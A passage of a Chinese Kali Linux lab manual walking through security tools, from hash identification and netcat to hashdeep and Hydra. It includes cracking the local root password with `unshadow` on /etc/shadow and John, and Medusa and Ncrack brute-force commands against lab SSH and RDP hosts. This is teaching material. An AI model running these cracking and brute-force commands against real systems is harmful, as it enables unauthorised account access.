bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [fourth\_hash\_value]</span><br></pre></td></tr></table></figure><ul><li>复制第五组数据到hash-identifier，识别结果是SHA-512。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [fifth\_hash\_value]</span><br></pre></td></tr></table></figure><ul><li>复制第六组数据到hash-identifier，识别结果最可能的算法是Tiger-192。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [sixth\_hash\_value]</span><br></pre></td></tr></table></figure><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>验证Hash-Identifier工具对MD5等常见编码是否能成功识别。</p><h1 id="实验-15-离线攻击工具-John工具"><a href="#实验-15-离线攻击工具-John工具" class="headerlink" title="实验 15 离线攻击工具-John工具"></a>实验 15 离线攻击工具-John工具</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用John工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>john</p><p><strong>实验目的</strong></p><p>掌握kali下john工具的使用</p><h2 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动John工具</strong></p><p>先启动john软件，在终端输入以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john</span><br></pre></td></tr></table></figure><p><strong>2. 获取本机密码散列</strong></p><p>利用john破解密码，首先需要散列，这里我们把本机的密码散列作为密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; pasd</span><br></pre></td></tr></table></figure><p><strong>3. 使用John破解密码</strong></p><p>直接使用本地的散列去进行破解，破解出本机的root密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john pasd</span><br></pre></td></tr></table></figure><h2 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考John工具成功爆破的前提是在哪？</p><h1 id="实验-16-密码爆破-Medusa"><a href="#实验-16-密码爆破-Medusa" class="headerlink" title="实验 16 密码爆破-Medusa"></a>实验 16 密码爆破-Medusa</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Medusa工具，<br>来检测内网中是否存在弱口令服务，为避免在部署时候出现什么问题，小明首先在自己的虚<br>拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018<br>靶机 centos6.9</p><p><strong>实验工具</strong></p><p>medusa</p><p><strong>实验目的</strong></p><p>了解并掌握密码爆破软件medusa的基本用法</p><h2 id="实验步骤-5"><a href="#实验步骤-5" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动Medusa</strong></p><p>Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare), NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP (AUTH&#x2F;VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。</p><p>在终端输入以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa</span><br></pre></td></tr></table></figure><p><strong>2. 查看可用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -d</span><br></pre></td></tr></table></figure><p><strong>3. 查看模块帮助</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M telnet -q</span><br></pre></td></tr></table></figure><p><strong>4. 爆破靶机的ssh</strong></p><p>需要在本机先新增一个<code>username.txt</code>和<code>password.txt</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.163.150 -u username.txt -P password.txt -M ssh</span><br></pre></td></tr></table></figure><h2 id="实验总结-2"><a href="#实验总结-2" class="headerlink" title="实验总结"></a>实验总结</h2><p>使用medusa工具批量爆破内网ip段，检测是否存在弱口令服务。</p><h1 id="实验-17-远程爆破工具-Ncrack"><a href="#实验-17-远程爆破工具-Ncrack" class="headerlink" title="实验 17 远程爆破工具-Ncrack"></a>实验 17 远程爆破工具-Ncrack</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Ncrack工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018 192.168.163.154<br>靶机 windows 7 192.168.163.134</p><p><strong>实验工具</strong></p><p>Ncrack</p><p><strong>实验目的</strong></p><p>了解并掌握Ncrack工具的使用方法</p><h2 id="实验步骤-6"><a href="#实验步骤-6" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 查看软件版本号</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ncrack –v</span><br><span class="line">``</span><br><span class="line">`</span><br><span class="line">\*\*2. 查看Ncrack帮助\*\*</span><br><span class="line">```bash</span><br><span class="line">ncrack --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p><strong>3. 爆破windows主机的3389</strong></p><p>需要先添加一个<code>usename.txt</code>和<code>password.txt</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncrack -vv -U usename.txt -P password.txt 192.168.163.134:3389 CL=1 -f</span><br></pre></td></tr></table></figure><p>根据爆破结果，使用<code>test/111111</code>使用rdesktop可以正常连接。</p><h2 id="实验总结-3"><a href="#实验总结-3" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考同样的爆破工具Ncrack和Medusa的差异和速度上有什么区别。</p><h1 id="实验-18-主机系统识别-p0f"><a href="#实验-18-主机系统识别-p0f" class="headerlink" title="实验 18 主机系统识别-p0f"></a>实验 18 主机系统识别-p0f</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用主机系统识别<br>p0f工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>p0f<br>xprobe2</p><p><strong>实验目的</strong></p><p>掌握使用工具来进行主机系统识别</p><h2 id="实验步骤-7"><a href="#实验步骤-7" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动p0f监听</strong></p><p>p0f是一款被动探测工具，通过分析网络数据包来判断操作系统类型。同时p0f在网络分析方面功能强大，可以用它来分析NAT、负载均衡、应用代理等。以下命令为监听网卡<code>eth0</code>并开启混杂模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p0f -i eth0 -p</span><br></pre></td></tr></table></figure><p><strong>2. 浏览器访问网页</strong></p><p>通过浏览器去访问网页，能通过p0f观察到对方的系统。</p><h2 id="实验总结-4"><a href="#实验总结-4" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考kali上最经典的扫描工具Nmap跟实验中p0f工具在识别结果上谁更准确。</p><h1 id="实验-19-主机系统识别-xprobe2"><a href="#实验-19-主机系统识别-xprobe2" class="headerlink" title="实验 19 主机系统识别-xprobe2"></a>实验 19 主机系统识别-xprobe2</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用xprobe 2 工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali2016</p><p><strong>实验工具</strong></p><p>xprobe2</p><p><strong>实验目的</strong></p><p>使用xprobe2进行远程系统识别</p><h2 id="实验步骤-8"><a href="#实验步骤-8" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>xprobe2是一款使用ICMP消息进行操作系统探测的软件，探测结果可以和Nmap互为参照。但是该软件目前公开版本为2005年的版本，对老的操作系统探测结果较为准确。对远程主机探测，可以直接通过xprobe2并制定远程主机ip或者主机名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xprobe2 [remote\_host\_ip\_or\_name]</span><br></pre></td></tr></table></figure><h2 id="实验总结-5"><a href="#实验总结-5" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考xprobe 2 识别主机方式跟nmap和p0f有什么不一样，可以通过抓包去分析。</p><h1 id="实验-20-数据取证-Hashdeep"><a href="#实验-20-数据取证-Hashdeep" class="headerlink" title="实验 20 数据取证-Hashdeep"></a>实验 20 数据取证-Hashdeep</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hashdeep工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>hashdeep</p><p><strong>实验目的</strong></p><p>了解数据取证工具hashdeep工具的使用</p><h2 id="实验步骤-9"><a href="#实验步骤-9" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在数据取证中，通常需要验证文件的哈希值，以判断文件是否已知好文件，或者文件是否被修改过。Kali Linux提供专用工具hashdeep。该工具的早期版本名称为md5deep。该工具可以批量计算文件的哈希值，并和哈希值列表进行比对。该工具支持多种哈希算法，可以避免哈希碰撞问题。为了满足不同任务的需要，hashdeep提供多种检查模式，如审计模式、正向模式、反向模式。同时，该工具支持大小写不敏感和UTF编码， 以满足Windows文件系统分析需要。</p></li><li><p>直接启动软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdeep –h</span><br></pre></td></tr></table></figure></li><li><p>直接生成本地文件hash值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印相对文件名而不是绝对文件名</span></span><br><span class="line">hashdeep –l ../\*</span><br><span class="line"><span class="comment"># 打印hash值到本地文件</span></span><br><span class="line">hashdeep –r test.txt &gt; hash.txt</span><br></pre></td></tr></table></figure></li><li><p>根据已知的hash值文件进行hash校验，如果一样即通过，如果不一样即审核不通过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdeep -r -a hash.txt test.txt</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>了解了hashdeep工具，以后在下载文件时，可以通过hashdeep比对文件的hash是否一致来保障文件的安全性。</p><h1 id="实验-21-NC端口通信实验"><a href="#实验-21-NC端口通信实验" class="headerlink" title="实验 21 NC端口通信实验"></a>实验 21 NC端口通信实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行通信，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>NC</p><p><strong>实验目的</strong></p><p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，学习它的基本使用</p><h2 id="实验步骤-10"><a href="#实验步骤-10" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.129 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机centos上使用nc开启服务端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 9999</span><br></pre></td></tr></table></figure></li><li><p>在kali上使用nmap对靶机进行端口扫描，发现9999端口是开放状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 192.168.127.129</span><br></pre></td></tr></table></figure></li><li><p>在靶机上使用telnet进行测试9999端口是否能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.127.129</span><br></pre></td></tr></table></figure></li><li><p>在kali上使用nc语句和靶机通信：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.127.129 9999</span><br></pre></td></tr></table></figure></li><li><p>在kali上输入语句的同时在靶机上也会进行实时显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is test</span><br></pre></td></tr></table></figure></li><li><p>在centos上进行查看发现两者一样的显示。</p></li><li><p>在靶机使用nc开启udp端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -ul 9999</span><br></pre></td></tr></table></figure></li><li><p>开启tcp时可以用telnet进行测试端口是否开启，但开启udp端口时，telnet却不能进行检测，此刻就需要使用到nc的udp端口检测语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vuz 192.168.163.127.129 9999</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握kali和centos使用NC进行通信的实验。</p><h1 id="实验-22-系统检查-Chkrootkit"><a href="#实验-22-系统检查-Chkrootkit" class="headerlink" title="实验 22 系统检查-Chkrootkit"></a>实验 22 系统检查-Chkrootkit</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Chkrootkit工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>chkrootkit</p><p><strong>实验目的</strong></p><p>掌握chkrootkit工具的使用</p><h2 id="实验步骤-11"><a href="#实验步骤-11" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>chkrootkit是用来监测rootkit是否被安装到当前系统中的工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit</span><br></pre></td></tr></table></figure><p>如果发现有异常，会报出“INFECTED”字样。</p></li><li><p>查看其它命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit –h</span><br></pre></td></tr></table></figure></li><li><p>跳过NFS挂载目录进行检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit -n</span><br></pre></td></tr></table></figure></li><li><p>查看chkrootkit版本号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit –V</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>尝试升级chkrootkit来检测本机是否存在疑问的文件。</p><h1 id="实验-23-信息收集-Dmitry"><a href="#实验-23-信息收集-Dmitry" class="headerlink" title="实验 23 信息收集-Dmitry"></a>实验 23 信息收集-Dmitry</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Dmitry工具，为避免在部署时候出现什么问题，小明首先在自己的</p><p>虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018 攻击机<br>windows 7 靶机 192.168.163.147</p><p><strong>实验工具</strong></p><p>dmitry</p><p><strong>实验目的</strong></p><p>掌握信息收集工具dmitry的使用</p><h2 id="实验步骤-12"><a href="#实验步骤-12" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>直接在终端中启动工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -h</span><br></pre></td></tr></table></figure></li><li><p>对主机进行端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry –p 192.168.163.147</span><br></pre></td></tr></table></figure><p>将输出保存到%host.txt或由-o文件指定的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry –p 192.168.163.147 –o <span class="built_in">test</span></span><br></pre></td></tr></table></figure></li><li><p>扫描端口同时读取从扫描端口接收的banner：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry – p 192.168.163.147 –b</span><br></pre></td></tr></table></figure></li><li><p>对主机的域名执行whois查找（需要联网操作）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry – w baidu.com</span><br></pre></td></tr></table></figure></li><li><p>在主机上检索Netcraft.com信息（需要联网操作）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry – n baidu.com</span><br></pre></td></tr></table></figure></li><li><p>执行搜索可能的子域（需要联网操作）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry – s baidu.com</span><br></pre></td></tr></table></figure></li><li><p>执行搜索可能的电子邮件地址（需要联网操作）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry – e baidu.com</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>思考在Dmitry工具中如果探测内网主机是否需要联网。</p><h1 id="实验-24-信息收集-Netdiscover"><a href="#实验-24-信息收集-Netdiscover" class="headerlink" title="实验 24 信息收集-Netdiscover"></a>实验 24 信息收集-Netdiscover</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Netdiscover工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>netdiscover</p><p><strong>实验目的</strong></p><p>了解netdiscover工具的使用</p><h2 id="实验步骤-13"><a href="#实验步骤-13" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>查看帮助：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover –h</span><br></pre></td></tr></table></figure></li><li><p>扫描本地网卡设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover –i eth0</span><br></pre></td></tr></table></figure></li><li><p>发送每个arp请求的次数，测试具有丢包的网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover –c 192.168.21.1</span><br></pre></td></tr></table></figure></li><li><p>扫描给定范围的主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover –r 192.168.21.0/24</span><br></pre></td></tr></table></figure></li><li><p>使用被动模式，只进行嗅探：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover –p</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握Netdiscover的嗅探模式，在特定地方有奇效。</p><h1 id="实验25-NC传输文件实验"><a href="#实验25-NC传输文件实验" class="headerlink" title="实验25 NC传输文件实验"></a>实验25 NC传输文件实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行文件传输实验，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>NC</p><p><strong>实验目的</strong></p><p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，使用nc进行文件传输</p><h2 id="实验步骤-14"><a href="#实验步骤-14" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.129 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在kali里面新建一个ceshi.txt文件并查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is test&quot;</span> &gt; ceshi.txt</span><br></pre></td></tr></table></figure></li><li><p>在靶机centos上使用nc监听端口9999，接受到的所有数据都写到test文件里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 9999 &gt; test.txt</span><br></pre></td></tr></table></figure></li><li><p>在kali上面使用nc把本地的ceshi文件发送给靶机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.127.129 9999 &lt; ceshi.txt</span><br></pre></td></tr></table></figure></li><li><p>在靶机上查看是否有文件生成（如果靶机接受文件不会自动停止，那就使用<code>ctrl+c</code>中止文件接受语句）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure></li><li><p>在靶机上查看传输过来的文件看内容是否一致：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> test.txt</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握kali和centos使用NC传输文件的操作。</p><h1 id="实验-26-抓包工具–Netsniff-ng"><a href="#实验-26-抓包工具–Netsniff-ng" class="headerlink" title="实验 26 抓包工具–Netsniff-ng"></a>实验 26 抓包工具–Netsniff-ng</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>netsniff-ng工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环<br>境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>netsniff-ng</p><p><strong>实验目的</strong></p><p>掌握netsniff-ng工具使用</p><h2 id="实验步骤-15"><a href="#实验步骤-15" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>抓取TCP或者UDP协议报文保存到dump.pcap</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsniff-ng --<span class="keyword">in</span> eth0 --out dump.pcap tcp or udp</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>直接打开会出现乱码，需要结合其他分析工具进行分析数据包</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capinfo dump.pcap</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>测试网卡最高传输速率，方法是先用trafgen产生traffic让网卡满负荷，再用netsniff-ng抓包分析</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsniff-ng -i eth0 - o /dev/shm/c1.pcap -s -n 1000000 -b 0</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>分析抓包的数据包</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capinfos /dev/shm/c1.pcap</span><br></pre></td></tr></table></figure><h2 id="实验总结-6"><a href="#实验总结-6" class="headerlink" title="实验总结"></a>实验总结</h2><p>对比Netsniff-ng和Wireshark的差异性在那。</p><h1 id="实验27-Hash算法之MD5"><a href="#实验27-Hash算法之MD5" class="headerlink" title="实验27 Hash算法之MD5"></a>实验27 Hash算法之MD5</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>MD5工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>md5sum</p><p><strong>实验目的</strong></p><p>掌握通过md5sum的使用和对比md5的HASH值</p><h2 id="实验步骤-16"><a href="#实验步骤-16" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>计算一个新建文件test.txt的md5值</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> test.txt</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>修改文件中内容再重新计算md5值，对比之下发现md5变了</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> test.txt</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>通过已知的md5值跟文件的md5值进行对比</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> –c md5.txt</span><br></pre></td></tr></table></figure><h2 id="实验总结-7"><a href="#实验总结-7" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握kali自带的MD5计算小工具的使用</p><h1 id="实验28-HASH算法之SHA"><a href="#实验28-HASH算法之SHA" class="headerlink" title="实验28 HASH算法之SHA"></a>实验28 HASH算法之SHA</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用SHA工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>shasum</p><p><strong>实验目的</strong></p><p>掌握shasum工具等使用和对比文件HASH值</p><h2 id="实验步骤-17"><a href="#实验步骤-17" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>直接输出test.txt的SHA值</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shasum test.txt</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>将sha1值输出到sha1.txt中</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha1sum</span> test.txt &gt; sha1.txt</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>通过已知的sha1对文件的完整性进行比对</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha1sum</span> –c sha1.txt</span><br></pre></td></tr></table></figure><h2 id="实验总结-8"><a href="#实验总结-8" class="headerlink" title="实验总结"></a>实验总结</h2><p>利用SHA1来快速比对文件的hash值是否发生变化</p><h1 id="实验-29-黑客安防工具-Hydra"><a href="#实验-29-黑客安防工具-Hydra" class="headerlink" title="实验 29 黑客安防工具-Hydra"></a>实验 29 黑客安防工具-Hydra</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hydra工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>windows 7</p><p><strong>实验工具</strong></p><p>hydra</p><p><strong>实验目的</strong></p><p>了解hydra并掌握使用hydra工具</p><h2 id="实验步骤-18"><a href="#实验步骤-18" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>在终端输入hydra，可以看到相关使用语法</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>参数列表:</strong></p><ul><li>-R 恢复上次停止的破解进度，继续破解</li><li>-S 使用SSL连接</li><li>-s PORT if the service is on a different default port, define it here</li><li>-s 端口号 在这里自定义要破解的端口号(替代默认端口)</li><li>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE</li><li>-l 登录名 或者 - L 字典 使用登录名 或者 从字典中获取登录名单</li><li>-p PASS or -P FILE try password PASS, or load several passwords from FILE</li><li>-p 密码 或者 - P 字典 使用单个密码 或者 从字典中获取密码列表</li><li>-e ns 附加选项,n 是表示空密码,s 尝试使用密码进行破解</li><li>-C FILE colon-separated “login:pass” format, instead of -L&#x2F;-P options</li><li>-C 文件 使用冒号分割格式 例如 “登录名:密码”来代替-L&#x2F;-P参数</li><li>-M FILE server list for parallel attacks, one entry per line</li><li>-M 文件 服务器列表(译者:ip列表),一行一条</li><li>-o FILE write found login&#x2F;password pairs to FILE 